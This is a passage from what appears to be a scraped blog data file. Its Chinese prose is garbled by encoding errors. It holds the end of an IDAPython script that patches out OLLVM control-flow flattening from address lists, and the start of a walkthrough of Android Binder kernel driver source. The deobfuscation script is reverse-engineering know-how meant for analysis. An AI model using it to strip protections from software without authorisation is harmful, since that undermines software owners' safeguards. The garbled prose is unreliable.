1), ((4203641, 4203651), 1), ((4203319, 4203341), 1), ((4203346, 4203366), 1), ((4203371, 4203398), 1), ((4203403, 4203428), 1), ((4203656, 4203689), 1), ((4203694, 4203737), 1), ((4203742, 4203776), 1), ((4203781, 4203804), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 0), ((4203893, 4203918), 0), ((4203923, 4203957), 0), ((4203962, 4203981), 1), ((4203986, 4204025), 1), ((4204030, 4204040), 1), ((4204045, 4204067), 1), ((4204072, 4204091), 0), ((4204096, 4204118), 1), ((4204123, 4204133), 1), ((4203809, 4203831), 1), ((4203836, 4203856), 1), ((4203861, 4203888), 1), ((4203893, 4203918), 1), ((4204138, 4204171), 1)]tbs = [(4204176, 4204182), (4203066, 4203066), (4203071, 4203098), (4203103, 4203157), (4203162, 4203314), (4203319, 4203341), (4203346, 4203366), (4203371, 4203398), (4203403, 4203428), (4203433, 4203457), (4203462, 4203490), (4203495, 4203514), (4203519, 4203558), (4203563, 4203585), (4203590, 4203609), (4203614, 4203636), (4203641, 4203651), (4203656, 4203689), (4203694, 4203737), (4203742, 4203776), (4203781, 4203804), (4203809, 4203831), (4203836, 4203856), (4203861, 4203888), (4203893, 4203918), (4203923, 4203957), (4203962, 4203981), (4203986, 4204025), (4204030, 4204040), (4204045, 4204067), (4204072, 4204091), (4204096, 4204118), (4204123, 4204133), (4204138, 4204171)]fbs = [(4202133, 4202159), (4202165, 4202165), (4202170, 4202187), (4202193, 4202193), (4202198, 4202215), (4202221, 4202221), (4202226, 4202243), (4202249, 4202249), (4202254, 4202271), (4202277, 4202277), (4202282, 4202299), (4202305, 4202305), (4202310, 4202327), (4202333, 4202333), (4202338, 4202355), (4202361, 4202361), (4202366, 4202383), (4202389, 4202389), (4202394, 4202411), (4202417, 4202417), (4202422, 4202439), (4202445, 4202445), (4202450, 4202467), (4202473, 4202473), (4202478, 4202495), (4202501, 4202501), (4202506, 4202523), (4202529, 4202529), (4202534, 4202551), (4202557, 4202557), (4202562, 4202579), (4202585, 4202585), (4202590, 4202607), (4202613, 4202613), (4202618, 4202635), (4202641, 4202641), (4202646, 4202663), (4202669, 4202669), (4202674, 4202691), (4202697, 4202697), (4202702, 4202719), (4202725, 4202725), (4202730, 4202747), (4202753, 4202753), (4202758, 4202775), (4202781, 4202781), (4202786, 4202803), (4202809, 4202809), (4202814, 4202831), (4202837, 4202837), (4202842, 4202859), (4202865, 4202865), (4202870, 4202887), (4202893, 4202893), (4202898, 4202915), (4202921, 4202921), (4202926, 4202943), (4202949, 4202949), (4202954, 4202971), (4202977, 4202977), (4202982, 4202999), (4203005, 4203005), (4203010, 4203027), (4203033, 4203033), (4203038, 4203055), (4203061, 4203061), (4203066, 4203066), (4203071, 4203098), (4203103, 4203157), (4203162, 4203314), (4203319, 4203341), (4203346, 4203366), (4203371, 4203398), (4203403, 4203428), (4203433, 4203457), (4203462, 4203490), (4203495, 4203514), (4203519, 4203558), (4203563, 4203585), (4203590, 4203609), (4203614, 4203636), (4203641, 4203651), (4203656, 4203689), (4203694, 4203737), (4203742, 4203776), (4203781, 4203804), (4203809, 4203831), (4203836, 4203856), (4203861, 4203888), (4203893, 4203918), (4203923, 4203957), (4203962, 4203981), (4203986, 4204025), (4204030, 4204040), (4204045, 4204067), (4204072, 4204091), (4204096, 4204118), (4204123, 4204133), (4204138, 4204171), (4204183, 4204183)]block_info = &#123;&#125; #åˆ¤æ–­æœ‰æ²¡æœ‰ patch ç»“æŸfor i in range(len(tbs)): block_info[tbs[i][0]] = &#123;'finish': 0,'ret':0&#125;#nop æ‰æ‰€æœ‰è™šå‡å—for fb in fbs: patch_nop(fb[1], fb[1] + idc.get_item_size(fb[1]))for tb in tbs: dont_patch = False current_addr = tb[0] while current_addr &lt;= tb[1]: # print(hex(current_addr),idc.GetDisasm(current_addr)) if \"cmov\" in idc.print_insn_mnem(current_addr): #cmov æŒ‡ä»¤ä¼šå½±å“åˆ†æ”¯è·³è½¬ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥ patch æ‰ patch_nop_line(current_addr) dont_patch = True # print(hex(current_addr),hex(tb_path[i][0])) elif internal_reg in idc.print_operand(current_addr, 0): print('find internal_reg!') patch_nop_line(current_addr) elif 'ret' in idc.print_insn_mnem(current_addr): block_info[tb[0]]['ret'] = 1 dont_patch = True current_addr = idc.next_head(current_addr) if not dont_patch: patch_nop_line(tb[1]) block_info[tb[0]]['finish'] = 1# åºè¨€å— -> ç¬¬ä¸€ä¸ªçœŸå®å— patchjmp_patch(preamble_block, tb_path[0][0][0])for i in range(len(tb_path) - 1): # ä¸æ˜¯è¿”å›å—ï¼Œä¹Ÿæœªå®Œæˆ patch, å‰©ä¸‹çš„æŒ‡ä»¤éƒ½æ˜¯æœ‰åˆ†æ”¯è·³è½¬çš„. if block_info[tb_path[i][0][0]]['finish'] == 0 and not block_info[tb_path[i][0][0]]['ret']: ZF = tb_path[i][1] #å½“è¦è·³è½¬çš„å—å’Œå½“å‰å—ä¸è¿ç»­æ—¶ï¼Œè¿™ä¸ªåˆ†æ”¯è·³è½¬æ‰ä¿®å¤å®Œæˆ if not idc.next_head(tb_path[i][0][1]) == tb_path[i + 1][0][0]: block_info[tb_path[i][0][0]]['finish'] = 1 j_code = ('jnz', 'jz') jmp_patch(tb_path[i][0][1], tb_path[i + 1][0][0], j_code[ZF])patch å®Œä¹‹åçœ‹ä¸€ä¸‹ï¼Œè¿™ä¸ªä»£ç ä¹Ÿå¤ªå¥½çœ‹äº†å§å“ˆå“ˆå“ˆï¼ (â—'â—¡'â—) å°å°æ€»ç»“ä¸€ä¸‹ï¼Œæ„Ÿè§‰ ollvm çš„æ§åˆ¶æµå¹³å¦åŒ–å»æ··æ·†åŸæ¥é‚£ä¹ˆç®€å•å‘ï½å»å¹´ sec2023 å®‰å“èµ›é¢˜çš„ CESL-BR æ··æ·†å’Œ CEST-BR æ··æ·†çš„åæ··æ·† idapython è„šæœ¬å¯çœŸæ˜¯æŠŠæˆ‘å†™æ˜è¿‡å»äº† (å€’) # å‚è€ƒèµ„æ–™ ollvm å¿«é€Ÿå­¦ä¹  è·Ÿç€é“å¤´å¹²æ··æ·† 3 ubuntu ä¸‹ç”¨ docker ç¼–è¯‘ ollvm (ä¿è¯æˆåŠŸ) OLLVM æ··æ·†å­¦ä¹ ï¼ˆ0ï¼‰â€”â€” ç¯å¢ƒæ­å»ºåŠæ··æ·†åˆä½“éªŒ åˆ©ç”¨ angr ç¬¦å·æ‰§è¡Œå»é™¤è™šå‡æ§åˆ¶æµ [åŸåˆ›] Android APP æ¼æ´ä¹‹æˆ˜ï¼ˆ14ï¼‰â€”â€”Ollvm æ··æ·†ä¸åæ··æ·† åˆ©ç”¨ç¬¦å·æ‰§è¡Œå»é™¤æ§åˆ¶æµå¹³å¦åŒ– ä»£ç æ··æ·†ä¸åæ··æ·†å­¦ä¹  - ç¬¬ä¸€å¼¹","categories":[],"tags":[{"name":"ollvm","slug":"ollvm","permalink":"https://oacia.dev/tags/ollvm/"}]},{"title":"android binderæºç åˆ†æ","slug":"android-binder","date":"2024-07-06T06:25:21.000Z","updated":"2024-07-09T03:32:10.205Z","comments":true,"path":"android-binder/","link":"","permalink":"https://oacia.dev/android-binder/","excerpt":"","text":"Binder æ˜¯ Android ç‹¬æœ‰çš„ä¸€ç§é€šä¿¡æœºåˆ¶ï¼Œ Activity ï¼Œ Service ï¼Œ Broadcast ï¼Œ ContentProvider è¿™å››å¤§ç»„ä»¶æ‰€æ¶‰åŠçš„å¤šè¿›ç¨‹é—´çš„é€šä¿¡åº•å±‚éƒ½æ˜¯ä¾èµ–äº Binder IPC æœºåˆ¶ã€‚å­¦å¥½åº•å±‚çš„é€šä¿¡åŸç†å¯¹æŒæ¡å®‰å“è¿™å¹¢å¤§å¦æœ‰ç€é‡è¦çš„æ„ä¹‰. # è¯´æ˜ æœ¬æ–‡æ‰€ç ”ç©¶çš„å®‰å“å†…æ ¸ç‰ˆæœ¬ä¸º Linux version 4.9.270-g862f51bac900-ab7613625 å®‰å“æ¡†æ¶ç‰ˆæœ¬ä¸º android-12.0.0_r34 # Binder ç®€ä»‹ ä»è¿›ç¨‹è§’åº¦æ¥çœ‹ IPC (Inter Process Communication) æœºåˆ¶ï¼Œæ¯ä¸ª Android çš„è¿›ç¨‹ï¼Œåªèƒ½è¿è¡Œåœ¨è‡ªå·±è¿›ç¨‹æ‰€æ‹¥æœ‰çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚å¯¹äºç”¨æˆ·ç©ºé—´ï¼Œä¸åŒè¿›ç¨‹ä¹‹é—´å½¼æ­¤æ˜¯ä¸èƒ½å…±äº«çš„ï¼Œè€Œå†…æ ¸ç©ºé—´å´æ˜¯å¯å…±äº«çš„ã€‚Client è¿›ç¨‹å‘ Server è¿›ç¨‹é€šä¿¡ï¼Œæ°æ°æ˜¯åˆ©ç”¨è¿›ç¨‹é—´å¯å…±äº«çš„å†…æ ¸å†…å­˜ç©ºé—´æ¥å®Œæˆåº•å±‚é€šä¿¡å·¥ä½œçš„ï¼ŒClient ç«¯ä¸ Server ç«¯è¿›ç¨‹å¾€å¾€é‡‡ç”¨ ioctl ç­‰æ–¹æ³•è·Ÿå†…æ ¸ç©ºé—´çš„é©±åŠ¨è¿›è¡Œäº¤äº’ã€‚ Binder é€šä¿¡é‡‡ç”¨ C/S æ¶æ„ï¼Œä»ç»„ä»¶è§†è§’æ¥è¯´ï¼ŒåŒ…å« Clientã€Serverã€ServiceManager ä»¥åŠ binder é©±åŠ¨ï¼Œå…¶ä¸­ ServiceManager ç”¨äºç®¡ç†ç³»ç»Ÿä¸­çš„å„ç§æœåŠ¡ã€‚æ¶æ„å›¾å¦‚ä¸‹æ‰€ç¤ºï¼Œå›¾ä¸­çš„ Client,Server,Service Manager ä¹‹é—´äº¤äº’éƒ½æ˜¯è™šçº¿è¡¨ç¤ºï¼Œæ˜¯ç”±äºå®ƒä»¬å½¼æ­¤ä¹‹é—´ä¸æ˜¯ç›´æ¥äº¤äº’çš„ï¼Œè€Œæ˜¯éƒ½é€šè¿‡ Binder é©±åŠ¨è¿›è¡Œäº¤äº’çš„ï¼Œä»è€Œå®ç° IPC é€šä¿¡æ–¹å¼ã€‚å…¶ä¸­ Binder é©±åŠ¨ä½äºå†…æ ¸ç©ºé—´ï¼ŒClient,Server,Service Manager ä½äºç”¨æˆ·ç©ºé—´ã€‚ # Binder è®¾å¤‡çš„åˆå§‹åŒ–è¿‡ç¨‹ åœ¨ Linux ä¸­ï¼Œä¸‡ç‰©çš†æ–‡ä»¶ï¼Œé‚£ä¹ˆæ¯«æ— ç–‘é—®ï¼ŒBinder å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒçš„åˆå§‹åŒ–å‡½æ•°æ˜¯ binder_init , ä¸»è¦åŠŸèƒ½æ˜¯æ³¨å†Œ binder è®¾å¤‡ //kernel\\drivers\\android\\binder.cstatic int __init binder_init(void)&#123; int ret; char *device_name, *device_names, *device_tmp; struct binder_device *device; struct hlist_node *tmp; // åˆå§‹åŒ– lru é“¾è¡¨ï¼Œè¯¥é“¾è¡¨ç”¨äºç®¡ç†å†…å­˜é¡µï¼›æ³¨å†Œ shrinker ç»“æ„ä½“ ret = binder_alloc_shrinker_init(); if (ret) return ret; // åŸå­æ“ä½œèµ‹å€¼ atomic_set(&amp;binder_transaction_log.cur, ~0U); atomic_set(&amp;binder_transaction_log_failed.cur, ~0U); /**debug ç›¸å…³çš„ä»£ç ï¼Œä¹‹å debug ç›¸å…³çš„ä»£ç å°†ä¸å†å‡ºç° **/ // åœ¨ debugfs æ–‡ä»¶ç³»ç»Ÿåˆ›å»ºäº† binder æ–‡ä»¶å¤¹ binder_debugfs_dir_entry_root = debugfs_create_dir(\"binder\", NULL); // å¦‚æœ binder æ–‡ä»¶å¤¹åˆ›å»ºæˆåŠŸï¼Œåˆ™åœ¨è¯¥æ–‡ä»¶å¤¹å†…ç»§ç»­åˆ›å»º binder/proc æ–‡ä»¶å¤¹ if (binder_debugfs_dir_entry_root) binder_debugfs_dir_entry_proc = debugfs_create_dir(\"proc\", binder_debugfs_dir_entry_root); if (binder_debugfs_dir_entry_root) &#123; // ç»§ç»­åœ¨ binder ç›®å½•ä¸­åˆ›å»º state,stats,transactions,transaction_log,failed_transaction_log æ–‡ä»¶ï¼Œè¯»å– Binder é©±åŠ¨ç¨‹åºçš„è¿è¡Œæƒ…å†µ debugfs_create_file(\"state\", 0444, binder_debugfs_dir_entry_root, NULL, &amp;binder_state_fops); debugfs_create_file(\"stats\", 0444, binder_debugfs_dir_entry_root, NULL, &amp;binder_stats_fops); debugfs_create_file(\"transactions\", 0444, binder_debugfs_dir_entry_root, NULL, &amp;binder_transactions_fops); debugfs_create_file(\"transaction_log\", 0444, binder_debugfs_dir_entry_root, &amp;binder_transaction_log, &amp;binder_transaction_log_fops); debugfs_create_file(\"failed_transaction_log\", 0444, binder_debugfs_dir_entry_root, &amp;binder_transaction_log_failed, &amp;binder_transaction_log_fops); &#125; /* * Copy the module_parameter string, because we don't want to * tokenize it in-place. */ // åœ¨å†…æ ¸ç©ºé—´ä¸­åˆ†é…å†…å­˜ï¼ŒGFP_KERNEL è¡¨ç¤ºæ­£å¸¸åˆ†é…å†…å­˜ device_names = kzalloc(strlen(binder_devices_param) + 1, GFP_KERNEL); if (!device_names) &#123; ret = -ENOMEM; goto err_alloc_device_names_failed; &#125; // å°† binder,hwbinder,vndbinder èµ‹å€¼ç»™ device_names strcpy(device_names, binder_devices_param); device_tmp = device_names; while ((device_name = strsep(&amp;device_tmp, \",\"))) &#123; // ä»¥ \",\" ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæ³¨å†Œ misc è®¾å¤‡ /dev/binder/dev/hwbinder/dev/vndbinder ret = init_binder_device(device_name); if (ret) goto err_init_binder_device_failed; &#125; return ret;err_init_binder_device_failed: hlist_for_each_entry_safe(device, tmp, &amp;binder_devices, hlist) &#123; misc_deregister(&amp;device->miscdev); hlist_del(&amp;device->hlist); kfree(device); &#125; kfree(device_names);err_alloc_device_names_failed: debugfs_remove_recursive(binder_debugfs_dir_entry_root); return ret;&#125;åœ¨ binder_init ä¸­ï¼Œè°ƒç”¨äº† init_binder_device é€šè¿‡ misc_register æ¥æ³¨å†Œ binder è®¾å¤‡ //kernel\\drivers\\android\\binder.cstatic const struct file_operations binder_fops = &#123; .owner = THIS_MODULE, .poll = binder_poll, .unlocked_ioctl = binder_ioctl, .compat_ioctl = binder_ioctl,//IO æ§åˆ¶å‡½æ•° .mmap = binder_mmap,// å†…å­˜æ˜ å°„å‡½æ•° .open = binder_open,//binder æ–‡ä»¶æ‰“å¼€å‡½æ•° .flush = binder_flush, .release = binder_release,&#125;;static int __init init_binder_device(const char *name)&#123; int ret; struct binder_device *binder_device; binder_device = kzalloc(sizeof(*binder_device), GFP_KERNEL); if (!binder_device) return -ENOMEM; binder_device->miscdev.fops = &amp;binder_fops;//// è®¾å¤‡çš„æ–‡ä»¶æ“ä½œç»“æ„ï¼Œè¿™æ˜¯ file_operations ç»“æ„ binder_device->miscdev.minor = MISC_DYNAMIC_MINOR;// æ¬¡è®¾å¤‡å· åŠ¨æ€åˆ†é… binder_device->miscdev.name = name;//// è®¾å¤‡å // è®¾ç½® binder_contextï¼Œç”¨äºè®°å½• servicemanager çš„ binder_node ä¿¡æ¯ï¼Œ // ç”±äº binder_device æ˜¯å…¨å±€å”¯ä¸€çš„ï¼Œè¿™æ˜¯ servicemanager å¯ä»¥æˆä¸ºå®ˆæŠ¤è¿› // ç¨‹çš„å…³é”®ã€‚ binder_device->context.binder_context_mgr_uid = INVALID_UID; binder_device->context.name = name; mutex_init(&amp;binder_device->context.context_mgr_node_lock); // æ³¨å†Œ binder è®¾å¤‡ ret = misc_register(&amp;binder_device->miscdev); if (ret &lt; 0) &#123; kfree(binder_device); return ret; &#125; hlist_add_head(&amp;binder_device->hlist, &amp;binder_devices); return ret;&#125;# Binder è®¾å¤‡æ–‡ä»¶çš„æ‰“å¼€è¿‡ç¨‹ ä¸€ä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨ binder è¿›è¡Œé€šä¿¡ä¹‹å‰ï¼Œéœ€è¦ä½¿ç”¨ open å‡½æ•°æ¥æ‰“å¼€è®¾å¤‡æ–‡ä»¶ /dev/binder, åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ binder_open å‡½æ•°å°±ä¼šè¢«è°ƒç”¨ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å¦‚ä¸‹ åˆ›å»º binder_proc å¯¹è±¡ æŠŠå½“å‰è¿›ç¨‹ç­‰ä¿¡æ¯ä¿å­˜åˆ° binder_proc å¯¹è±¡ æŠŠ binder_proc å¯¹è±¡ä¿å­˜åˆ°æ–‡ä»¶æŒ‡é’ˆ filp æŠŠ binder_proc åŠ å…¥åˆ°å…¨å±€é“¾è¡¨ binder_procs ã€‚ //kernel\\drivers\\android\\binder.cstatic int binder_open(struct inode *nodp, struct file *filp)&#123; struct binder_proc *proc; struct binder_device *binder_dev; binder_debug(BINDER_DEBUG_OPEN_CLOSE, \"%s: %d:%d\\n\", __func__, current->group_leader->pid, current->pid); // åˆ›å»º binder_proc ç»“æ„ä½“éå† procï¼Œå¹¶ä¸º proc å®ç°åˆå§‹åŒ– proc = kzalloc(sizeof(*proc), GFP_KERNEL); if (proc == NULL) return -ENOMEM; spin_lock_init(&amp;proc->inner_lock); spin_lock_init(&amp;proc->outer_lock); atomic_set(&amp;proc->tmp_ref, 0); get_task_struct(current->group_leader); /* ä»»ä½•ä¸€ä¸ªè¿›ç¨‹ï¼Œå¦‚æœåªæœ‰ä¸»çº¿ç¨‹ï¼Œé‚£ pid æ˜¯è‡ªå·±ï¼Œtgid æ˜¯è‡ªå·±ï¼Œgroup_leader æŒ‡å‘çš„è¿˜æ˜¯è‡ªå·±ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä¸€ä¸ªè¿›ç¨‹åˆ›å»ºäº†å…¶ä»–çº¿ç¨‹ï¼Œé‚£å°±ä¼šæœ‰æ‰€å˜åŒ–äº†ã€‚çº¿ç¨‹æœ‰è‡ªå·±çš„ pidï¼Œtgid å°±æ˜¯è¿›ç¨‹çš„ ä¸»çº¿ç¨‹çš„ pidï¼Œgroup_leader æŒ‡å‘çš„å°±æ˜¯è¿›ç¨‹çš„ä¸»çº¿ç¨‹ã€‚ æœ‰äº† tgid ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­ä¸€ä¸ª task æ˜¯çº¿ç¨‹è¿˜æ˜¯è¿›ç¨‹äº†ã€‚ pid : æ¯ä¸ª task éƒ½æœ‰ä¸€ä¸ª pidï¼Œæ˜¯å”¯ä¸€çš„ï¼Œä¸ç®¡æ˜¯è¿›ç¨‹è¿˜æ˜¯çº¿ç¨‹ã€‚ tgid: æŒ‡å‘ä¸»çº¿ç¨‹çš„ pid */ //group_leader: æŒ‡å‘è¿›ç¨‹çš„ä¸»çº¿ç¨‹ proc->tsk = current->group_leader; mutex_init(&amp;proc->files_lock); // åˆå§‹åŒ– todo é˜Ÿåˆ— INIT_LIST_HEAD(&amp;proc->todo); // åˆå§‹åŒ–è¿›ç¨‹ä¼˜å…ˆçº§ if (binder_supported_policy(current->policy)) &#123; proc->default_priority.sched_policy = current->policy; proc->default_priority.prio = current->normal_prio; &#125; else &#123; proc->default_priority.sched_policy = SCHED_NORMAL; proc->default_priority.prio = NICE_TO_PRIO(0); &#125; // åˆå§‹åŒ– binder_dev,proc->context,proc->alloc binder_dev = container_of(filp->private_data, struct binder_device, miscdev); proc->context = &amp;binder_dev->context; binder_alloc_init(&amp;proc->alloc); //binder_alloc åˆå§‹åŒ– binder_stats_created(BINDER_STAT_PROC); proc->pid = current->group_leader->pid; INIT_LIST_HEAD(&amp;proc->delivered_death); INIT_LIST_HEAD(&amp;proc->waiting_threads); // å°†åˆå§‹åŒ–å®Œæˆçš„ binder_proc ç»“æ„ä½“ proc ä¿å­˜åˆ° filp->private_data ä¸­ //filp æŒ‡å‘ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ç»“æ„ä½“ï¼Œå®ƒå’Œè¿›ç¨‹è°ƒç”¨ open å‡½æ•°æ‰“å¼€è®¾å¤‡æ–‡ä»¶ ///dev/binder ä¹‹åå†…æ ¸è¿”å›ç»™è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯ç›¸äº’å…³è”çš„ filp->private_data = proc; mutex_lock(&amp;binder_procs_lock); // å°† binder_proc ç»“æ„ä½“ proc åŠ å…¥åˆ°ä¸€ä¸ªå…¨å±€å“ˆå¸Œé˜Ÿåˆ— binder_procs ä¸­ //binder é€šè¿‡éå†è¿™ä¸ªå“ˆå¸Œé˜Ÿåˆ—å°±å¯ä»¥çŸ¥é“æœ‰å¤šå°‘è¿›ç¨‹åœ¨ä½¿ç”¨ binder hlist_add_head(&amp;proc->proc_node, &amp;binder_procs); mutex_unlock(&amp;binder_procs_lock); return 0;&#125;# Binder è®¾å¤‡æ–‡ä»¶çš„å†…å­˜æ˜ å°„è¿‡ç¨‹ åœ¨æ‰“å¼€äº†è®¾å¤‡æ–‡ä»¶ /dev/binder ä¹‹åï¼Œè¿˜éœ€è¦è°ƒç”¨ mmap å‡½æ•°æ¥æŠŠè¿™ä¸ªè®¾å¤‡æ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œæ­¤æ—¶ binder é©±åŠ¨ç¨‹åºä¸­çš„ binder_mmap å‡½æ•°å°±ä¼šè¢«è°ƒç”¨ï¼Œä¸»è¦åŠŸèƒ½ï¼šåœ¨å†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œç”³è¯·ä¸€å—ä¸ç”¨æˆ·è™šæ‹Ÿå†…å­˜ç›¸åŒå¤§å°çš„å†…å­˜ï¼›ç„¶åå†ç”³è¯· 1 ä¸ª page å¤§å°çš„ç‰©ç†å†…å­˜ï¼Œå†å°†åŒä¸€å—ç‰©ç†å†…å­˜åˆ†åˆ«æ˜ å°„åˆ°å†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´å’Œç”¨æˆ·è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œä»è€Œå®ç°äº†ç”¨æˆ·ç©ºé—´çš„ Buffer å’Œå†…æ ¸ç©ºé—´çš„ Buffer åŒæ­¥æ“ä½œçš„åŠŸèƒ½ã€‚ //kernel\\drivers\\android\\binder.cstatic int binder_mmap(struct file *filp, struct vm_area_struct *vma)&#123; int ret; struct binder_proc *proc = filp->private_data; const char *failure_string; // ä¿è¯è¯·æ±‚åˆ†é…å†…å­˜çš„çº¿ç¨‹ä¸ºä¸»çº¿ç¨‹ if (proc->tsk != current->group_leader) return -EINVAL; // ä¿è¯æ˜ å°„å†…å­˜ &lt;= 4MB, è¯´æ˜ Binder æœ€å¤šèƒ½ä¸ºè¿›ç¨‹åˆ†é… 4MB çš„å†…æ ¸ç¼“å†²åŒºæ¥ä¼ è¾“æ•°æ® if ((vma->vm_end - vma->vm_start) > SZ_4M) vma->vm_end = vma->vm_start + SZ_4M; binder_debug(BINDER_DEBUG_OPEN_CLOSE, \"%s: %d %lx-%lx (%ld K) vma %lx pagep %lx\\n\", __func__, proc->pid, vma->vm_start, vma->vm_end, (vma->vm_end - vma->vm_start) / SZ_1K, vma->vm_flags, (unsigned long)pgprot_val(vma->vm_page_prot)); //#define FORBIDDEN_MMAP_FLAGS (VM_WRITE) // æ£€æŸ¥è¿›ç¨‹è¦æ˜ å°„çš„åœ°å€ç©ºé—´æ˜¯å¦å¯å†™ if (vma->vm_flags &amp; FORBIDDEN_MMAP_FLAGS) &#123; ret = -EPERM; failure_string = \"bad vm_flags\"; goto err_bad_arg; &#125; //VM_DONTCOPY /* Do not copy this vma on fork */ //VM_MIXEDMAP /* Can contain \"struct page\" and pure PFN pages */ // ç¦æ­¢æ‹·è´ vma->vm_flags |= VM_DONTCOPY | VM_MIXEDMAP; // ä¸ºè¯¥å†…å­˜èµ‹äºˆ r-x æƒé™ vma->vm_flags &amp;= ~VM_MAYWRITE; vma->vm_ops = &amp;binder_vm_ops; vma->vm_private_data = proc; // 